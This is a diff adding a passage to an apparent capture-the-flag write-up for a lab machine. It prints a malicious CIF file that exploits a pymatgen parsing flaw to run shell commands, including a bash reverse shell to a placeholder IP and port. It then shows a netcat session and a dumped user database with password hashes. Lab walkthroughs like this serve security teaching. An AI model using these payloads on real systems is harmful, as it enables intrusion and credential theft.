@@ -64,3 +64,89 @@ After clicking "Register here," we are presented with a form requiring a usernam
 Once the information is filled out, we will submit the form to create the account and then attempt to log in with the same credentials.
 
 ![alt text](images/4.png)
+![alt text](images/5.png)
+![alt text](images/6.png)
+![alt text](images/7.png)
+![alt text](images/8.png)
+
+https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f
+
+```
+_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("touch pwned");0,0,0'
+
+
+_space_group_magn.number_BNS  62.448
+_space_group_magn.name_BNS  "P  n'  m  a'  "
+```
+
+```
+data_Example
+_cell_length_a    10.00000
+_cell_length_b    10.00000
+_cell_length_c    10.00000
+_cell_angle_alpha 90.00000
+_cell_angle_beta  90.00000
+_cell_angle_gamma 90.00000
+_symmetry_space_group_name_H-M 'P 1'
+loop_
+ _atom_site_label
+ _atom_site_fract_x
+ _atom_site_fract_y
+ _atom_site_fract_z
+ _atom_site_occupancy
+ H 0.00000 0.00000 0.00000 1
+ O 0.50000 0.50000 0.50000 1
+_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c \'sh -i >& /dev/tcp/{IP}/{PORT} 0>&1\'");0,0,0'
+_space_group_magn.number_BNS  62.448
+_space_group_magn.name_BNS  "P  n'  m  a'  "
+```
+![alt text](image.png)
+
+```
+h4wker㉿alien nc -nlvp 4444
+listening on [any] 4444 ...
+connect to [10.10.14.10] from (UNKNOWN) [10.10.11.38] 50294
+sh: 0: can't access tty; job control turned off
+$ python3 -c 'import pty; pty.spawn("/bin/bash")'
+app@chemistry:~$ export TERM=xterm
+export TERM=xterm
+app@chemistry:~$ 
+app@chemistry:~$ cd instance
+cd instance
+app@chemistry:~/instance$ ls -l
+ls -l
+total 20
+-rwx------ 1 app app 20480 Nov  8 01:11 database.db
+app@chemistry:~/instance$ cat database.db
+cat database.db
+�f�K�ytableuseruserCREATE TABLE user (
+        id INTEGER NOT NULL,
+        username VARCHAR(150) NOT NULL,
+        password VARCHAR(150) NOT NULL,
+        PRIMARY KEY (id),
+        UNIQUE (username)
+)';indexsqlite_autoindex_user_1user�3�5tablestructurestructureCREATE TABLE structure (
+        id INTEGER NOT NULL,
+        user_id INTEGER NOT NULL,
+        filename VARCHAR(150) NOT NULL,
+        identifier VARCHAR(100) NOT NULL,
+        PRIMARY KEY (id),
+        FOREIGN KEY(user_id) REFERENCES user (id),
+        UNIQUE (identifier)
+���[��n5#Ucomando.cif23abad75-9e75-4399-b37f-d3cfacd8d83e5#Uexample.cif9c6337c4-5b1e-458f-b08a-08a28969af49
+I��V*���zM U9c6337c4-5b1e-458f-b08a-08a28969af49((U23abad75-9e75-4399-b37f-d3cfacd8d83e
+Maxel9347f9724ca083b17e39555c36fd9007*62cacffbdaded457c6d92(dc20036dbd8313ed055(Mcris7bb0bb352ffb2f5245f25149889a0c76+                  Mfabian4e5d71f53fdd2eabdbabb233113b5dc0+gelacia4af70c80b6826eusebio6cad48078d0241cca9a7b322ecd073b3)        Mtaniaa4aa55e816205dc0389591c9f82f43bbMvictoriac3601ad2286a4293868ec2a4bc606ba3)Mpeter6845c17d298d95aa942127bdad2ceb9b*Mcarlos9ad48828b0955513f7cf0f7f6510c8f8*Mjobert3dec299e06f7ed187bac06bd3b670ab2*Mrobert02fcf7cfc10adc37959fb21f06c6b467(Mrosa63ed86ee9f624c7b14f1d4f43dc251a5'Mapp197865e46b878d9e74a0346b6d59886a)Madmin2861debaf8d99436a10ed6f75a252abf
+O��x�c���O�l����Z�
+h4wketescris
+            risteaxel
+fabian
+
+      elacia
+
+            usebio
+        tania
+                victoriapeter
+carlos
+jobert
+roberrosaapp    adminapp@chemistry:~/instance$
+```
